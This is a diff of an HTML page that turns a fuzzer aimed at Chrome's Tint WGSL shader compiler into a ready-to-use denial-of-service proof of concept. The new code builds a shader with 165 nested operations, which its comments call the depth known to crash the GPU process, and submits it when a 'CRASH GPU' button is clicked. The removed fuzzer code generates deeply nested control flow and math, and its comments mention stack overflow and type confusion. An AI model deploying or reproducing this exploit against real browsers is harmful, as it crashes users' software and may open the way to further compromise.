@@ -1,91 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebGPU WGSL Compiler Fuzzer</title>
-    <style>body { background: #111; color: #ff00ff; font-family: monospace; font-size: 14px; }</style>
+    <title>WebGPU Tint Recursion DoS PoC</title>
+    <style>body { font-family: monospace; background: #222; color: #0f0; font-size: 18px; }</style>
 </head>
 <body>
-    <h2>Attacking Chrome's Tint Shader Compiler</h2>
-    <button id="fuzzBtn" style="padding:15px; background:#ff00ff; color:#000; font-weight:bold; cursor:pointer;">START WGSL FUZZER</button>
-    <pre id="log" style="white-space: pre-wrap; word-wrap: break-word;"></pre>
+    <h2>Tint AST Recursive Depth DoS</h2>
+    <p>Clicking the button will instantly crash the GPU Process.</p>
+    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">CRASH GPU</button>
 
     <script>
-        const logEl = document.getElementById('log');
-        function log(msg) { logEl.innerText = msg + '\n' + logEl.innerText.substring(0, 1000); }
-
-        // Generate deeply nested mathematical operations
-        function generateDeepMath(depth) {
-            if (depth <= 0) return "(1.0)";
+        // We use the exact magic depth (165) discovered in the wild that 
+        // triggers the AST abort state corruption and SIGTRAP.
+        function buildKillerShader() {
+            let mathExpr = "(1.0)";
             const ops = ['+', '-', '*', '/'];
-            const op = ops[Math.floor(Math.random() * ops.length)];
-            return `(${generateDeepMath(depth - 1)} ${op} vec4<f32>(vec2<f32>(1.0, 1.0), vec2<f32>(1.0, 1.0)).x)`;
-        }
-
-        // Generate deeply nested control flow (if/else/loop)
-        function generateDeepControlFlow(depth) {
-            if (depth <= 0) return `return vec4<f32>(1.0, 0.0, 0.0, 1.0);`;
-            return `
-                if (true) {
-                    loop {
-                        if (false) { break; }
-                        ${generateDeepControlFlow(depth - 1)}
-                    }
-                } else {
-                    ${generateDeepControlFlow(depth - 1)}
-                }
-            `;
-        }
-
-        // Generate the malicious shader string
-        function generateEvilShader() {
-            // Randomly decide whether to attack the math parser or the AST control flow parser
-            const attackType = Math.random();
-            let body = "";
-
-            if (attackType > 0.5) {
-                // Attack 1: Extreme AST depth (causes C++ Stack Overflow in Tint)
-                body = generateDeepControlFlow(Math.floor(Math.random() * 50) + 20);
-            } else {
-                // Attack 2: Extreme Math parsing (causes memory exhaustion or type-confusion)
-                body = `let crazy_var = ${generateDeepMath(Math.floor(Math.random() * 100) + 50)};\n return vec4<f32>(crazy_var, 0.0, 0.0, 1.0);`;
+            
+            for (let i = 0; i < 165; i++) {
+                // Using the exact payload structure from the crash log
+                const op = ops[i % 4]; 
+                mathExpr = `(${mathExpr} ${op} vec4<f32>(vec2<f32>(1.0, 1.0), vec2<f32>(1.0, 1.0)).x)`;
             }
-
             return `
                 @vertex fn vs_main() -> @builtin(position) vec4<f32> {
-                    ${body}
-                    return vec4<f32>(0.0,0.0,0.0,1.0);
+                    let crazy_var = ${mathExpr};
+                    return vec4<f32>(crazy_var, 0.0, 0.0, 1.0);
                 }
             `;
         }
 
-        async function runFuzzer() {
-            if (!navigator.gpu) { log("WebGPU not supported!"); return; }
+        async function triggerCrash() {
+            if (!navigator.gpu) {
+                alert("WebGPU is not supported.");
+                return;
+            }
+
             const adapter = await navigator.gpu.requestAdapter();
             const device = await adapter.requestDevice();
-            log("[+] Device acquired. Spawning Shader Modules...");
 
-            let runs = 0;
-
-            setInterval(() => {
-                runs++;
-                if(runs % 10 === 0) log(`[+] Compiled ${runs} malicious shaders...`);
-
-                const evilWGSL = generateEvilShader();
-
-                try {
-                    // Send the massive string to the C++ Tint Compiler
-                    // This is where Chrome parses the text and builds the AST!
-                    device.createShaderModule({
-                        code: evilWGSL
-                    });
-                    
-                } catch (e) {
-                    // Syntax errors are normal during fuzzing
-                }
-            }, 10); 
+            const killerWGSL = buildKillerShader();
+            console.log("Sending payload to Tint...");
+            
+            try {
+                // This call crashes the GPU Process
+                device.createShaderModule({ code: killerWGSL });
+            } catch (e) {
+                console.log("Caught:", e);
+            }
         }
 
-        document.getElementById('fuzzBtn').addEventListener('click', runFuzzer);
+        document.getElementById('crashBtn').addEventListener('click', triggerCrash);
     </script>
 </body>
 </html>
